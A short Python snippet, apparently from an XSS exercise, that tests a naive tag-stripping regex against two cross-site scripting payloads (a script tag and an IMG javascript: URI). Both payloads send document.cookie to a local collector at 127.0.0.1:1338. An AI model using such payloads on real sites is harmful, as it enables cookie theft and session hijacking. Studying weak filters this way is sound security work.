import re

comment = '<script>window.open("http://127.0.0.1:1338/xss/2?cookie=" + document.cookie)</script>'
comment = '<IMG SRC="javascript:window.open(&apos;http://127.0.0.1:1338/xss/2?cookie=&apos; + document.cookie);">'
comment = ''
print(comment)
comment = re.sub(r'<[a-z]*>', '', comment, flags=re.IGNORECASE)
print(comment)
